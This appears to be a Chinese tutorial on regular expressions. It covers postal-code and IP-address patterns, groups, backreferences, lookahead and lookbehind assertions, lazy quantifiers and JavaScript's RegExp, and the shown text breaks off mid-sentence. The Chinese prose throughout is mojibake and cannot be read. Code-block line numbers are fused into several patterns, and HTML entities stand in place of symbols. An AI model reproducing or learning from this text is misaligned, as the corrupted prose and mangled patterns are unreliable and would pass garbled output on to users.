è¿™ä¸ªè¡¨è¾¾å¼ç”¨äºŽåŒ¹é…ç¾Žå›½çš„é‚®æ”¿ç¼–ç ã€‚å®ƒçš„è§„åˆ™æ˜¯5ä½æ•°å­—ï¼Œæˆ–è€…ç”¨è¿žå­—å·é—´éš”çš„9ä½æ•°å­—ã€‚# è¿™è¦éœ€è¦æ³¨æ„ï¼Œä¸èƒ½æ”¹æˆ \d&#123;5&#125;|\d&#123;5&#125;-d&#123;4&#125;ï¼Œè¿™æ ·å°±åªä¼šåŒ¹é…5ä½é‚®ç¼–ï¼ˆä»¥åŠ9ä½é‚®ç¼–çš„å‰5ä½ï¼‰ã€‚åŽŸå› æ˜¯åŒ¹é…åˆ†æ”¯æ¡ä»¶æ—¶ï¼Œä¼šä»Žå·¦åˆ°å³æµ‹è¯•æ¯ä¸ªæ¡ä»¶ï¼Œå¦‚æžœæ»¡è¶³äº†æŸä¸ªåˆ†æ”¯çš„è¯ï¼Œå°±ä¸ä¼šåŽ»ç®¡å…¶ä»–æ¡ä»¶äº†ã€‚ åˆ†ç»„é‡å¤å•ä¸ªå­—ç¬¦ï¼Œç›´æŽ¥åœ¨å­—ç¬¦åŽé¢åŠ ä¸Šé™å®šç¬¦å°±å¥½äº†ã€‚å¦‚æžœæƒ³è¦é‡å¤å¤šä¸ªå­—ç¬¦çš„è¯ï¼Œå¯ä»¥ç”¨å°æ‹¬å·æ¥æŒ‡å®šå­è¡¨è¾¾å¼ï¼ˆåˆ†ç»„ï¼‰ï¼Œç„¶åŽå°±å¯ä»¥æŒ‡å®šè¿™ä¸ªå­è¡¨è¾¾å¼çš„é‡å¤æ¬¡æ•°äº†ï¼Œæˆ–è€…æ˜¯å…¶ä»–çš„æ“ä½œã€‚ 123456ï¼ˆ\d&#123;1,3&#125;\.)&#123;3&#125;\d&#123;1,3&#125;# ä¸Šé¢æ˜¯ä¸€ä¸ªç®€ç­”çš„ ipåœ°å€åŒ¹é…ã€‚\d&#123;1,3&#125;åŒ¹é…1åˆ°3ä½æ•°å­—# (\d&#123;1,3&#125;\.)&#123;3&#125;åŒ¹é…ä¸‰ä½æ•°å­—åŠ ä¸Šä¸€ä¸ªè‹±æ–‡å¥å·ï¼Œè¿™ä¸ªæ•´ä½“ä¹Ÿæ˜¯è¿™ä¸ªåˆ†ç»„é‡å¤äº†3æ¬¡ï¼Œæœ€åŽå†åŠ ä¸Šä¸€ä¸ª1åˆ°3ä½çš„æ•°å­— \d&#123;1,3&#125;# ç¼ºæ¼çš„åœ°æ–¹åœ¨äºŽå®ƒä¹Ÿä¼šåŒ¹é… 256.300.899.999 è¿™ç§ä¸å­˜åœ¨çš„ip åœ°å€ã€‚# æ­£ç¡®çš„åœ°å€(ipåœ°å€ä¸­æ¯ä¸ªæ•°å­—éƒ½ä¸èƒ½å¤§äºŽ255ï¼Œå¯ä»¥æœ‰å‰å¯¼0)((2[0-4]\d|25[0-5]|[01]?\d\d?)\.)&#123;3&#125;(2[0-4]\d|25[0-5]|[01]?\d\d?) åä¹‰æœ‰æ—¶å€™éœ€è¦æŸ¥æ‰¾çš„ä¸æ˜¯æŸä¸ªèƒ½ç®€å•å®šä¹‰çš„å­—ç¬¦ç±»çš„å­—ç¬¦ã€‚æ¯”å¦‚æƒ³æŸ¥æ‰¾é™¤äº†æ•°å­—ä»¥å¤–çš„ï¼Œå…¶ä»–ä»»æ„å­—ç¬¦éƒ½è¡Œçš„æƒ…å†µï¼Œè¿™æ—¶å€™å°±éœ€è¦åä¹‰ã€‚ ä»£ç /è¯­æ³• è¯´æ˜Ž \W åŒ¹é…ä»»æ„ä¸æ˜¯å­—æ¯ã€æ•°å­—ã€ä¸‹åˆ’çº¿æˆ–è€…æ±‰å­—çš„å­—ç¬¦ \S åŒ¹é…ä»»æ„ä¸æ˜¯ç©ºç™½ç¬¦çš„å­—ç¬¦ \D åŒ¹é…ä»»æ„ä¸æ˜¯æ•°å­—çš„å­—ç¬¦ \B åŒ¹é…ä¸æ˜¯å•è¯å¼€å¤´æˆ–è€…ç»“æŸçš„ä½ç½® [^X] åŒ¹é…é™¤äº† X ä»¥å¤–çš„ä»»æ„çš„å­—ç¬¦ [^aeiou] åŒ¹é…é™¤äº† aeiou è¿™ä¸ªå­—æ¯ä¸Žä»¥å¤–çš„ä»»æ„å­—ç¬¦ ä¾‹å­ï¼š \S+åŒ¹é…ä¸åŒ…æ‹¬ç©ºç™½ç¬¦çš„å­—ç¬¦ä¸² &lt;a[^&gt;]+&gt;åŒ¹é…ç”¨å°–æ‹¬å·æ‹¬èµ·æ¥çš„ä»¥ aå¼€å¤´çš„å­—ç¬¦ä¸² åŽå‘å¼•ç”¨ä½¿ç”¨å°æ‹¬å·æŒ‡å®šä¸€ä¸ªå­è¡¨è¾¾å¼åŽï¼ŒåŒ¹é…è¿™ä¸ªå­è¡¨è¾¾å¼çš„æ–‡æœ¬ï¼ˆä¹Ÿå°±æ˜¯æ­¤åˆ†ç»„æ•èŽ·çš„å†…å®¹ï¼‰å¯ä»¥åœ¨è¡¨è¾¾å¼æˆ–è€…å…¶ä»–ç¨‹åºä¸­ä½œè¿›ä¸€æ­¥çš„å¤„ç†ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œæ¯ä¸ªåˆ†ç»„éƒ½ä¼šè‡ªåŠ¨æ‹¥æœ‰ä¸€ä¸ªç»„å·ï¼Œè§„åˆ™å°±æ˜¯ï¼šä»Žå·¦åˆ°å³ï¼Œä»¥åˆ†ç»„çš„å·¦æ‹¬å·ä¸ºæ ‡å¿—ï¼Œç¬¬ä¸€ä¸ªå‡ºçŽ°çš„åˆ†ç»„çš„ç»„å·ä¸º1ï¼Œç¬¬äºŒä¸ªä¸º2ï¼Œä¾æ¬¡ç±»æŽ¨ã€‚ åˆ†ç»„0ä»£è¡¨æ•´ä¸ªæ­£åˆ™è¡¨è¾¾å¼ï¼Œå®žé™…ä¸Šç»„å·åˆ†é…è¿‡ç¨‹æ˜¯è¦ä»Žå·¦å‘å³æ‰«æä¸¤éçš„ï¼Œç¬¬ä¸€éåªç»™æœªå‘½åç»„åˆ†é…ï¼Œç¬¬äºŒéåªç»™å‘½åç»„åˆ†é…ï¼Œå› ä¸ºæ‰€æœ‰å‘½åç»„çš„ç»„å·éƒ½å¤§äºŽæœªå‘½åçš„ç»„å·ã€‚ å¯ä»¥ä½¿ç”¨ (?:exp)è¿™æ ·çš„è¯­æ³•æ¥å‰¥å¤ºä¸€ä¸ªåˆ†ç»„å¯¹ç»„å·åˆ†é…çš„å‚ä¸Žæƒ åŽå‘å¼•ç”¨ï¼Œç”¨äºŽé‡å¤æœç´¢å‰é¢çš„æŸä¸ªåˆ†ç»„åŒ¹é…çš„æ–‡æœ¬ã€‚ä¾‹å¦‚ï¼Œ\1ä»£è¡¨åˆ†ç»„1åŒ¹é…çš„æ–‡æœ¬ã€‚ 12\b(\w+)\b\s+\1\b# åŒ¹é…é‡å¤çš„å•è¯ï¼Œè¿™ä¸ªè¡¨è¾¾å¼é¦–å…ˆæ˜¯ä¸€ä¸ªå•è¯ï¼Œä¹Ÿå°±æ˜¯å•è¯å¼€å§‹å¤„å’Œå•è¯ç»“æŸå¤„ä¹‹é—´å¤šäºŽä¸€ä¸ªçš„å­—æ¯æˆ–è€…æ•°å­—ï¼ˆ\b(\w+)\bï¼‰ï¼Œè¿™ä¸ªå•è¯ä¼šè¢«æ•èŽ·åˆ°ç¼–ç ä¸º1çš„åˆ†ç»„ä¸­ï¼Œç„¶åŽæ˜¯1ä¸ªæˆ–è€…å‡ ä¸ªç©ºç™½ç¬¦(\s+)ï¼Œæœ€åŽåˆ†ç»„1ä¸­æ•èŽ·çš„å†…å®¹ï¼ˆä¹Ÿå°±æ˜¯å‰é¢åŒ¹é…çš„é‚£ä¸ªå•è¯ï¼‰ï¼ˆ\1ï¼‰ ä¹Ÿå¯ä»¥è‡ªå·±æŒ‡å®šå­è¡¨è¾¾å¼çš„ç»„åï¼Œè¦æŒ‡å®šä¸€ä¸ªå­è¡¨è¾¾å¼çš„ç»„åï¼Œä½¿ç”¨è¿™æ ·çš„è¯­æ³•: (?&lt;Word&gt;\w+)æˆ–è€…(?&#39;Word&#39;\w+)è¿™æ ·å°±æŠŠ \wçš„ç»„åæŒ‡å®šä¸º Wordã€‚è¦åå‘å¼•ç”¨è¿™ä¸ªåˆ†ç»„æ•èŽ·çš„å†…å®¹ï¼Œå¯ä»¥ä½¿ç”¨\k&lt;Word&gt;ï¼Œä¸Šé¢çš„ä¾‹å­ä¹Ÿå¯ä»¥å†™æˆè¿™æ ·ï¼š 1\b(?&lt;Word&gt;\w+)\b\s+\k&lt;Word&gt;\b ä¸‹è¡¨æ˜¯å¸¸ç”¨åˆ†ç»„è¯­æ³•ï¼š åˆ†ç±» ä»£ç /è¯­æ³• è¯´æ˜Ž æ•èŽ· (exp) åŒ¹é… exp,å¹¶æ•èŽ·æ–‡æœ¬åˆ°è‡ªåŠ¨å‘½åçš„ç»„é‡Œ (?\exp) åŒ¹é… expï¼Œå¹¶æ•èŽ·æ–‡æœ¬åˆ°åç§°ä¸º name çš„ç»„é‡Œï¼Œä¹Ÿå¯ä»¥å†™æˆ (?&#39;name&#39;exp) (?:exp) åŒ¹é… expï¼Œä¸æ•èŽ·åŒ¹é…çš„æ–‡æœ¬ï¼Œä¹Ÿä¸ç»™æ­¤åˆ†ç»„çš„åˆ†é…ç»„å· é›¶å®½æ–­è¨€ (?= exp) åŒ¹é… exp å‰é¢çš„ä½ç½® (?&lt;= exp) åŒ¹é… exp åŽé¢çš„ä½ç½® (?!exp) åŒ¹é…åŽé¢è·Ÿçš„ä¸æ˜¯ exp çš„ä½ç½® (?&lt;!exp) åŒ¹é…å‰é¢ä¸æ˜¯ exp çš„ä½ç½® æ³¨é‡Š (?#comment) è¿™ç§ç±»åž‹çš„åˆ†ç»„ä¸å¯¹æ­£åˆ™è¡¨è¾¾å¼çš„å¤„ç†äº§ç”Ÿä»»ä½•å½±å“ï¼Œç”¨äºŽæ³¨é‡Šè®©äººé˜…è¯» é›¶å®½æ–­è¨€æ–­è¨€ç”¨æ¥å£°æ˜Žä¸€ä¸ªåº”è¯¥ä¸ºçœŸçš„äº‹å®žï¼Œæ­£åˆ™è¡¨è¾¾å¼ä¸­åªæœ‰å½“æ–­è¨€ä¸ºçœŸçš„æ—¶å€™æ‰ä¼šç»§ç»­è¿›è¡ŒåŒ¹é…ã€‚ ç”¨äºŽæŸ¥æ‰¾åœ¨æŸäº›å†…å®¹å‰æˆ–è€…ä¹‹åŽçš„ä¸œè¥¿ï¼Œåƒ \bã€^ã€$é‚£æ ·ç”¨äºŽæŒ‡å®šä¸€ä¸ªä½ç½®ï¼Œè¿™ä¸ªä½ç½®åº”è¯¥æ»¡è¶³ä¸€å®šçš„æ¡ä»¶ï¼ˆæ–­è¨€ï¼‰ï¼Œå› æ­¤å®ƒä»¬è¢«ç§°ä¸ºé›¶å®½æ–­è¨€ã€‚ (?=exp)ä¹Ÿå«é›¶å®½åº¦æ­£é¢„æµ‹å…ˆè¡Œæ–­è¨€ï¼ˆZero-width positive lookaheadï¼‰ï¼Œå®ƒæ–­è¨€è‡ªèº«å‡ºçŽ°çš„ä½ç½®çš„åŽé¢èƒ½åŒ¹é…è¡¨è¾¾å¼ expã€‚æ¯”å¦‚ï¼Œ\b\w+(?=ing\b)ï¼ŒåŒ¹é…ä»¥ ingä¸ºç»“å°¾çš„å•è¯çš„å‰é¢éƒ¨åˆ†ï¼ˆé™¤äº† ing ä»¥å¤–çš„éƒ¨åˆ†ï¼‰ï¼Œå¦‚æŸ¥æ‰¾ I&#39;m singing while you&#39;re dancing.æ—¶ï¼Œå®ƒä¼šåŒ¹é… singå’Œ danc (?&lt;=exp)ä¹Ÿå«é›¶å®½åº¦æ­£å›žé¡¾åŽå‘æ–­è¨€(Zero-width positive lookbehind)ï¼Œå®ƒæ–­è¨€è‡ªèº«å‡ºçŽ°çš„ä¸ºä½ç½®çš„å‰é¢èƒ½åŒ¹é…è¡¨ç¤ºè¾¾ expï¼Œæ¯”å¦‚ (?&lt;=\bre)\w+\bä¼šåŒ¹é…ä»¥ reå¼€å¤´çš„å•è¯çš„åŽåŠéƒ¨åˆ†ï¼ˆé™¤äº†re ä»¥å¤–çš„éƒ¨åˆ†ï¼‰ã€‚ä¾‹å¦‚åœ¨æŸ¥æ‰¾ reading a bookæ—¶ï¼Œå®ƒåŒ¹é… adingã€‚ å‡å¦‚æƒ³è¦ç»™ä¸€ä¸ªå¾ˆé•¿çš„æ•°å­—ä¸­æ¯ä¸‰ä½åŠ ä¸€ä¸ªé€—å·ï¼Œä»Žå³è¾¹åŠ ã€‚å¯ä»¥è¿™æ ·æŸ¥æ‰¾å‰é¢å’Œé‡Œé¢æ·»åŠ é€—å·çš„éƒ¨åˆ†ï¼š 123456((?&lt;=\d)\d&#123;3&#125;)+\b# æŸ¥æ‰¾ 1234567890 =&gt; 234567890ï¼ˆ?&lt;=\sï¼‰\d+(?=\s)# åŒ¹é…ä»¥ç©ºç™½ç¬¦é—´éš”çš„æ•°å­—ï¼Œä¸åŒ…æ‹¬è¿™äº›ç©ºç™½ç¬¦# æŸ¥æ‰¾ 1234 56 7890 =&gt; 56 è´Ÿå‘é›¶å®½æ–­è¨€å‰é¢æåˆ°æ€Žä¹ˆæŸ¥æ‰¾ä¸æ˜¯æŸä¸ªå­—ç¬¦æˆ–è€…ä¸åœ¨æŸä¸ªå­—ç¬¦ç±»é‡Œé¢çš„å­—ç¬¦çš„æ–¹æ³•ï¼ˆåä¹‰ï¼‰ã€‚ä½†æ˜¯å¦‚æžœæˆ‘ä»¬åªæ˜¯æƒ³ç¡®ä¿æŸä¸ªå­—ç¬¦æ²¡æœ‰å‡ºçŽ°ï¼Œä½†ä¸æƒ³åŽ»åŒ¹é…å®ƒæ—¶ï¼Œä¾‹å¦‚æŸ¥æ‰¾è¿™æ ·çš„å•è¯â€”â€”å®ƒé‡Œé¢çš„å‡ºçŽ°äº†å­—æ¯q,ä½†æ˜¯qåŽé¢è·Ÿç€çš„ä¸æ˜¯å­—æ¯ uï¼Œæˆ‘ä»¬å¯ä»¥å°è¯•ï¼š 1234\b\w*q[^u]\w*\b# åŒ¹é…åŒ…å«åŽé¢ä¸æ˜¯å­—æ¯u çš„å­—æ¯qçš„å•è¯ã€‚ä½†æ˜¯ä½ å¯ä»¥å‘çŽ° [^u]æ€»è¦åŒ¹é…ä¸€ä¸ªå­—ç¬¦ï¼Œæ‰€ä»¥å¦‚æžœqæ˜¯å•è¯çš„æœ€åŽä¸€ä¸ªå­—ç¬¦çš„è¯ï¼ŒåŽé¢çš„[^u]æ€»è¦åŒ¹é…ä¸€ä¸ªå­—ç¬¦ï¼Œæˆ–è€…æ˜¯å¥å·æˆ–è€…æ˜¯å…¶ä»–çš„ä»€ä¹ˆã€‚åŽé¢çš„ \w*\b å°†ä¼šåŒ¹é…ä¸‹ä¸€ä¸ªå•è¯ï¼ŒäºŽæ˜¯ ä¸Šé¢çš„è¡¨è¾¾å¼å°±å¯ä»¥åŒ¹é…æ•´ä¸ª Iraq fightingã€‚# è´Ÿå‘é›¶å®½æ–­è¨€èƒ½è§£å†³è¿™æ ·çš„é—®é¢˜ï¼Œå› ä¸ºå®ƒåªåŒ¹é…ä¸€ä¸ªä½ç½®ï¼Œå¹¶ä¸æ¶ˆè´¹ä»»ä½•å­—ç¬¦ã€‚\b\w*q(?!u)\w*\b é›¶å®½åº¦è´Ÿé¢„æµ‹å…ˆè¡Œæ–­è¨€(?!exp)(Zero-width negative lookahead)ï¼Œæ–­è¨€æ­¤ä½ç½®åŽé¢ä¸èƒ½åŒ¹é…è¡¨è¾¾å¼expã€‚ ä¾‹å¦‚ï¼š 1234\d&#123;3&#125;(?!\d)# åŒ¹é…ä¸‰ä½æ•°å­—ï¼Œè€Œä¸”è¿™ä¸‰ä½æ•°å­—çš„åŽé¢ä¸èƒ½æ˜¯æ•°å­—\b((?!abc)\w)+\b# åŒ¹é…ä¸åŒ…æ‹¬è¿žç»­å­—ç¬¦ä¸² abc çš„å•è¯ åŒç†å¯ä»¥ç”¨é›¶å®½åº¦è´Ÿå›žé¡¾åŽå‘æ–­è¨€(?&lt;!exp)(Zero-width negative lookbehind)ï¼Œæ¥æ–­è¨€æ­¤ä½ç½®çš„å‰é¢ä¸èƒ½åŒ¹é…è¡¨è¾¾å¼ (?&lt;![a-z])\d{7},å³å‰é¢ä¸æ˜¯å°å†™å­—æ¯çš„ä¸ƒä½æ•°å­— ä¸€ä¸ªæ›´åŠ å¤æ‚çš„ä¾‹å­ï¼š (?&lt;=&lt;(\w+)&gt;).*(?=&lt;\/\1&gt;) åŒ¹é…ä¸åŒ…å«å±žæ€§çš„ç®€å• html æ ‡ç­¾å†…çš„å†…å®¹ã€‚(?&lt;=&lt;(\w+)&gt;)æŒ‡å®šäº†è¿™æ ·çš„å‰ç¼€ï¼šè¢«å°–æ‹¬å·æ‹¬èµ·æ¥çš„å•è¯ï¼Œç„¶åŽæ˜¯ .*(ä»»æ„çš„å­—ç¬¦ä¸²)ï¼Œæœ€åŽä¸€ä¸ªæ˜¯åŽç¼€(?=&lt;\/\1&gt;)ã€‚\/è½¬ä¹‰äº†ï¼Œ\1åå‘å¼•ç”¨ï¼Œæ•´ä¸ªå†…å®¹å°±æ˜¯é—­åˆæ ‡ç­¾ä¹‹é—´çš„å†…å®¹ï¼Œä¸åŒ…æ‹¬ä¸¤ä¸ªæ ‡ç­¾æœ¬èº«ã€‚ æ³¨é‡Šå°æ‹¬å·çš„å¦ä¸€ç§ç”¨é€”æ˜¯é€šè¿‡è¯­æ³•(?#comment)æ¥åŒ…å«æ³¨é‡Šã€‚ ä¾‹å¦‚ï¼š 12[0-4]\d(?#200-249)|25[0-5](?#250-255)|[01]?\d\d?(?#0-199) è¦åŒ…å«æ³¨é‡Šçš„è¯ï¼Œæœ€å¥½æ˜¯å¯ç”¨â€œå¿½ç•¥æ¨¡å¼é‡Œé¢çš„ç©ºç™½ç¬¦â€é€‰é¡¹ã€‚è¿™æ ·åœ¨ç¼–å†™è¡¨è¾¾å¼æ—¶èƒ½ä»»æ„çš„æ·»åŠ ç©ºæ ¼/TAB/æ¢è¡Œï¼Œè€Œå®žé™…ä½¿ç”¨æ—¶è¿™äº›éƒ½è¢«å¿½ç•¥ã€‚å¯ç”¨è¿™ä¸ªé€‰é¡¹åŽï¼Œåœ¨ #åŽé¢åˆ°è¿™ä¸€è¡Œç»“æŸçš„æ‰€æœ‰æ–‡æœ¬éƒ½è¢«å½“åšæ³¨é‡Šå¿½ç•¥æŽ‰ã€‚ä¾‹å¦‚ï¼Œæˆ‘ä»¬å¯ä»¥å‰é¢çš„ä¸€ä¸ªè¡¨è¾¾å¼å†™æˆè¿™æ ·ï¼š 1234567(?&lt;= # æ–­è¨€è¦åŒ¹é…çš„æ–‡æœ¬çš„å‰ç¼€&lt;(\w+)&gt; # æŸ¥æ‰¾å°–æ‹¬å·æ‹¬èµ·æ¥çš„å­—æ¯æˆ–è€…æ•°å­—ï¼ˆå³HTML/XMLæ ‡ç­¾ï¼‰) # å‰ç¼€ç»“æŸ.* # åŒ¹é…ä»»æ„æ–‡æœ¬(?= # æ–­è¨€è¦åŒ¹é…çš„æ–‡æœ¬çš„åŽç¼€&lt;\/\1&gt; # æŸ¥æ‰¾å°–æ‹¬å·æ‹¬èµ·æ¥çš„å†…å®¹ï¼šå‰é¢æ˜¯ä¸€ä¸ª '/'ï¼ŒåŽé¢æ˜¯å…ˆå‰æ•èŽ·çš„æ ‡ç­¾) # åŽç¼€ç»“æŸ è´ªå©ªä¸Žæ‡’æƒ°å½“æ­£åˆ™è¡¨è¾¾å¼ä¸­åŒ…å«èƒ½æŽ¥å—é‡å¤çš„é™å®šç¬¦æ—¶ï¼Œé€šå¸¸çš„è¡Œä¸ºæ˜¯ï¼ˆåœ¨ä½¿æ•´ä¸ªè¡¨è¾¾å¼èƒ½å¾—åˆ°åŒ¹é…çš„å‰æä¸‹ï¼‰åŒ¹é…å°½å¯èƒ½å¤šçš„å­—ç¬¦ã€‚ä»¥è¿™ä¸ªè¡¨è¾¾å¼ä¸ºä¾‹å­ï¼ša.*bï¼Œå®ƒå°†ä¼šåŒ¹é…æœ€é•¿çš„ä»¥aå¼€å§‹ï¼Œä»¥bç»“æŸçš„å­—ç¬¦ä¸²ã€‚å¦‚æžœç”¨å®ƒæ¥æœç´¢ aababçš„è¯ï¼Œå®ƒå°±ä¼šåŒ¹é…æ•´ä¸ª aababï¼Œè¿™è¢«ç§°ä¸ºè´ªå©ªåŒ¹é…ã€‚ æœ‰æ—¶å€™ï¼Œæˆ‘ä»¬éœ€è¦æ‡’æƒ°åŒ¹é…ï¼Œä¹Ÿå°±æ˜¯å°½å¯èƒ½å°‘çš„å­—ç¬¦ã€‚å‰é¢ç»™å‡ºçš„é™å®šç¬¦éƒ½å¯ä»¥è¢«è½¬åŒ–ä¸ºæ‡’æƒ°åŒ¹é…æ¨¡å¼ï¼Œåªè¦åœ¨å®ƒåŽé¢åŠ ä¸Šä¸€ä¸ªé—®å· ?ã€‚è¿™æ ·ï¼Œ.?è¿™æ„å‘³ç€åŒ¹é…ä»»æ„æ•°é‡çš„é‡å¤ï¼Œä½†æ˜¯åœ¨èƒ½ä½¿æ•´ä¸ªåŒ¹é…æˆåŠŸçš„å‰æä¸‹ä½¿ç”¨æœ€å°‘çš„é‡å¤ã€‚ a.*?båŒ¹é…æœ€çŸ­çš„ï¼Œä»¥aå¼€å§‹ï¼Œä»¥bç»“æŸçš„å­—ç¬¦ä¸²ã€‚å¦‚æžœæŠŠå®ƒåº”ç”¨äºŽ aababçš„è¯ï¼Œå®ƒä¼šåŒ¹é… aabå’Œ ab ä»£ç /è¯­æ³• è¯´æ˜Ž *? é‡å¤ä»»æ„æ¬¡ï¼Œä½†å°½å¯èƒ½å°‘é‡å¤ +? é‡å¤ 1æ¬¡æˆ–è€…æ›´å¤šæ¬¡ï¼Œä½†å°½å¯èƒ½å°‘é‡å¤ ?? é‡å¤ 0 æ¬¡æˆ–è€… 1 æ¬¡ï¼Œä½†å°½å¯èƒ½å°‘é‡å¤ {n,m}ï¼Ÿ é‡å¤ n åˆ° m æ¬¡ï¼Œä½†å°½å¯èƒ½å°‘é‡å¤ {n,}? é‡å¤ n æ¬¡ä»¥ä¸Šï¼Œä½†å°½å¯èƒ½å°‘é‡å¤ JS ä¸­çš„æ­£åˆ™è¡¨è¾¾å¼æ­£åˆ™è¡¨è¾¾å¼æ˜¯ç”¨äºŽåŒ¹é…å­—ç¬¦ä¸²ä¸­å­—ç¬¦ç»„åˆçš„æ¨¡å¼ã€‚åœ¨ JavaScript ä¸­ï¼Œæ­£åˆ™è¡¨è¾¾å¼ä¹Ÿæ˜¯å¯¹è±¡ï¼Œè¿™äº›æ¨¡å¼è¢«ç”¨äºŽ RegExpçš„testå’Œ execï¼Œä»¥åŠ Stringçš„ matchã€replaceã€searchå’Œ splitæ–¹æ³•ã€‚ åˆ›å»ºä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼1.ä½¿ç”¨ä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼å­—é¢é‡ï¼Œå…¶ç”±åŒ…å«æ–œæ ä¹‹é—´çš„æ¨¡å¼ç»„æˆï¼š 12const regex = /ab+c/;const regex = /^[a-zA-Z]+[0-9]*\W?_$/gi 2.è°ƒç”¨RegExpå¯¹è±¡çš„æž„é€ å‡½æ•°ï¼š 123let regex = new RegExp('ab+c');let regex = new RegExp(/^[a-zA-Z]+[0-9]*\W?_$/,'gi')let regex = new RegExp("^[a-zA-Z]+[0-9]*\\W?_$","gi") ç¼–å†™ä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼çš„æ¨¡å¼ä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼çš„æ¨¡å¼ç”±ç®€å•çš„å­—ç¬¦æ‰€æž„æˆï¼Œæ¯”å¦‚ /abc/ï¼Œæˆ–æ˜¯ç®€å•å’Œç‰¹æ®Šå­—ç¬¦çš„ç»„åˆï¼Œæ¯”å¦‚ /ab*c/æˆ–è€… /Chapter(\d+)\.\d*/ã€‚åŽè€…ç”¨åˆ°äº†æ‹¬å·ï¼Œå®ƒåœ¨æ­£åˆ™è¡¨è¾¾ä¸­å¯ä»¥è¢«å½“ä½œæ˜¯ä¸€ä¸ªè®°å¿†è®¾å¤‡ã€‚è¿™ä¸€éƒ¨åˆ†æ­£åˆ™æ‰€åŒ¹é…çš„å­—ç¬¦ä¼šè¢«è®°ä½ï¼Œåœ¨åŽé¢å¯ä»¥åˆ©ç”¨ã€‚ ä½¿ç”¨ç®€å•çš„æ¨¡å¼ ç®€å•çš„æ¨¡å¼ç”±æ‰¾åˆ°çš„ç›´æŽ¥åŒ¹é…æ‰€æž„æˆçš„ã€‚ 1234/abc/// åŒ¹é… Hi, do you know your abc's? // åŒ¹é… The latest airplane designs evolved from slabcraft.? // ä¸åŒ¹é… Grab crab ä½¿ç”¨ç‰¹æ®Šå­—ç¬¦ 12/ab*c/// åŒ¹é… cbbabbbbcdebc =&gt; abbbbc å­—ç¬¦ å«ä¹‰ \ åœ¨éžç‰¹æ®Šå­—ç¬¦ä¹‹å‰çš„åæ–œæ†è¡¨ç¤ºä¸‹ä¸€ä¸ªå­—ç¬¦æ˜¯ç‰¹æ®Šçš„ã€‚åæ–œæ†ä¹Ÿå¯ä»¥å°†å…¶åŽçš„ç‰¹æ®Šå­—ç¬¦ï¼Œè½¬ä¹‰ä¸ºå­—é¢é‡ã€‚ä½¿ç”¨ new RegExp(&#39;pattern&#39;)çš„æ—¶å€™è¦å°† \è½¬ä¹‰ï¼Œå› ä¸º \åœ¨å­—ç¬¦ä¸²é‡Œé¢ä¹Ÿæ˜¯ä¸€ä¸ªè½¬ä¹‰å­—ç¬¦ ^ åŒ¹é…è¾“å…¥çš„å¼€å§‹ã€‚å¦‚æžœå¤šè¡Œæ ‡å¿—è¢«è®¾ç½®ä¸º trueï¼Œé‚£ä¹ˆä¹ŸåŒ¹é…æ¢è¡Œç¬¦åŽç´§è·Ÿçš„ä½ç½®ã€‚ $ åŒ¹é…è¾“å…¥çš„ç»“æŸã€‚å¦‚æžœå¤šè¡Œæ ‡è¯†ç¬¦è¢«è®¾ç½®ä¸º trueï¼Œé‚£ä¹ˆä¹Ÿä¼šåŒ¹é…æ¢è¡Œç¬¦ä¹‹å‰çš„ä½ç½®ã€‚0 * åŒ¹é…å‰ä¸€ä¸ªè¡¨ç¤º0 æ¬¡æˆ–è€…å¤šæ¬¡ã€‚ç­‰ä»·äºŽ{0,} + åŒ¹é…å‰é¢ä¸€ä¸ªè¡¨è¾¾å¼1æ¬¡æˆ–è€…æ›´å¤šæ¬¡ï¼Œç­‰ä»·äºŽ {1,} ? åŒ¹é…å‰é¢ä¸€ä¸ªè¡¨è¾¾å¼0æ¬¡æˆ–è€…1æ¬¡ã€‚ç­‰ä»·äºŽ{0,1}å¦‚æžœç´§è·Ÿåœ¨ä»»ä½•é‡è¯ *ã€+ã€?ã€{}åŽé¢ï¼Œå°†ä¼šä½¿å¾—é‡è¯å˜æˆéžè´ªå©ªï¼ˆåŒ¹é…å°½é‡å°‘çš„å­—ç¬¦ï¼‰ï¼Œå’Œç¼ºçœä½¿ç”¨çš„è´ªå©ªæ¨¡å¼ï¼ˆåŒ¹é…å°½å¯èƒ½å¤šçš„å­—ç¬¦ï¼‰æ­£å¥½ç›¸å . ï¼ˆå°æ•°ç‚¹ï¼‰åŒ¹é…é™¤æ¢è¡Œç¬¦ä¹‹å¤–é¢çš„ä»»ä½•å•ä¸ªå­—ç¬¦ (x) åŒ¹é… â€˜xâ€™å¹¶è®°ä½åŒ¹é…é¡¹ã€‚æ‹¬å·è¢«ç§°ä¸ºæ•èŽ·æ‹¬å·ã€‚æ¨¡å¼/(foo)(bar)\1\2/åœ¨æ­£å¼è¡¨è¾¾å¼çš„æ›¿æ¢çŽ¯èŠ‚ï¼Œä½¿ç”¨ $1çš„è¯­æ³•ï¼Œä¾‹å¦‚ &#39;bar.foo&#39;.replace(/(..)(..)/,&#39;$2$1&#39;) (?:x) åŒ¹é…â€˜xâ€™ä½†ä¸è®°ä½åŒ¹é…é¡¹ã€‚è¿™ç§å«åšéžæ•èŽ·æ‹¬å·ï¼Œä½¿å¾—ä½ èƒ½å¤Ÿå®šä¹‰ä¸Žæ­£åˆ™è¡¨è¾¾å¼è¿ç®—ç¬¦ä¸€èµ·ä½¿ç”¨çš„å­è¡¨è¾¾å¼ã€‚ x(?=y) åŒ¹é…â€˜xâ€™ä»…ä»…å½“â€™xâ€™åŽé¢è·Ÿç€â€˜yâ€™ã€‚è¿™ç§å«å…ˆè¡Œæ–­è¨€ã€‚/Jack(?=Spart)/ä¼šåŒ¹é…åˆ° â€˜Jackâ€™ä»…å½“å®ƒåŽé¢è·Ÿç€â€™Spartâ€™ã€‚ä½†æ˜¯â€˜Spartâ€™éƒ½ä¸æ˜¯åŒ¹é…ç»“æžœä¸­çš„ä¸€éƒ¨åˆ† (?&lt;=y)x åŒ¹é…â€˜xâ€™ä»…ä»…å½“â€™xâ€™å‰é¢æ˜¯â€˜yâ€™,è¿™ç§å«åšåŽè¡Œæ–­è¨€ã€‚/(?&lt;=Jack)Spart/ä¼šåŒ¹é…åˆ° â€˜Spartâ€™ä»…ä»…å½“å®ƒå‰é¢æ˜¯â€˜Jackâ€™ã€‚`/(?&lt;=Jack Tom)Spart/`ä¼šåŒ¹é…åˆ° â€™Spartâ€˜ä»…ä»…å½“å®ƒå‰é¢æ˜¯ â€™Jackâ€˜æˆ–è€…æ˜¯ 